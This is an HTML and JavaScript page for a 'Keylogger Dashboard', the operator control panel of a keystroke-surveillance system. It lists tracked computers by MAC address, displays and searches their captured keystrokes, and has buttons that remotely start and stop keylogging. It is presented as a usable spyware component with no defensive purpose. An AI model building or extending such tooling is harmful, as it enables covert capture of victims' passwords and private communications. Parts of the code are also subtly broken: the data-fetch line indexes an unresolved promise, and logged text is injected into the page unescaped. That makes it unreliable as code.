<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Keylogger Dashboard</title>
    <link rel="stylesheet" href="style.css">
    <style>
        body {
            display: flex;
            flex-direction: column;
            font-family: Arial, sans-serif;
            margin: 0;
            height: 100vh;
            background: white;
        }
        .container {
            display: flex;
            flex-grow: 1;
        }
        .sidebar {
            width: 250px;
            background-color: #ececec;
            padding: 20px;
            box-shadow: 2px 0 5px rgba(0,0,0,0.1);
        }
        .content {
            flex-grow: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: flex-start;
            padding: 20px;
            color: #333;
        }
        .log-content {
            width: 80%;
            height: 70vh;
            overflow-y: auto;
            background: transparent;
            padding: 10px;
            color: #222;
            scrollbar-color: #ddd #ececec;
        }
        .search-box-container {
            display: flex;
            width: 80%;
            padding: 10px;
            border-top: 1px solid #ddd;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }
        .search-box {
            width: 250px;
            height: 30px;
            padding: 5px;
            font-size: 16px;
            border: 1px solid #ccc;
            border-radius: 10px;
            text-align: center;
        }
        .buttons {
            display: flex;
            gap: 10px;
        }
        .action-btn {
            padding: 10px 15px;
            border: none;
            color: white;
            cursor: pointer;
            border-radius: 5px;
            font-size: 14px;
            display: flex;
            align-items: center;
            gap: 5px;
        }
        .start-btn { background-color: red; }
        .stop-btn { background-color: black; }
        .dropdown {
            width: 100%;
            height: 40px;
            border-radius: 10px;
            padding: 5px;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="sidebar">
            <h2>Tracked Computers</h2>
            <select id="computer-list" class="dropdown" onchange="fetchData()">
                <option value="">Select a tracked computer</option>
            </select>
        </div>
        <div class="content">
            <h1 id="main-message">Select a tracked computer</h1>
            <div class="log-content" id="log-content"></div>
            <div class="search-box-container">
                <input type="text" class="search-box" placeholder="Search in keylogger data..." oninput="searchContent(this.value)">
                <button class="action-btn start-btn" onclick="startKeylogger()">üî¥ Start Keylogging</button>
                <button class="action-btn stop-btn" onclick="stopKeylogger()">‚è∏ Stop Keylogging</button>
            </div>
        </div>
    </div>
    <script>
        let logData = [];

        async function fetchComputers() {
            const response = await fetch('/get_users');
            const data = await response.json();
            const computerList = document.getElementById('computer-list');
            computerList.innerHTML = '<option value="">Select a tracked computer</option>';
            for (const mac in data) {
                const option = document.createElement('option');
                option.value = mac;
                option.textContent = mac;
                computerList.appendChild(option);
            }
        }

        async function fetchData() {
            const selectedMac = document.getElementById('computer-list').value;
            if (!selectedMac) return;
            const response = await fetch('/get_data');
            logData = await response.json()[selectedMac] || [];
            displayContent(logData);
        }

        function displayContent(content) {
            const logContent = document.getElementById('log-content');
            logContent.innerHTML = content.map(item => `<p>${item}</p>`).join('');
        }

        function searchContent(query) {
            if (!query) return displayContent(logData);
            const filtered = logData.filter(text => text.includes(query));
            displayContent(filtered);
        }

        async function startKeylogger() {
            await fetch('/start_keylogger', { method: 'POST' });
        }

        async function stopKeylogger() {
            await fetch('/stop_keylogger', { method: 'POST' });
        }

        fetchComputers();
    </script>
</body>
</html>
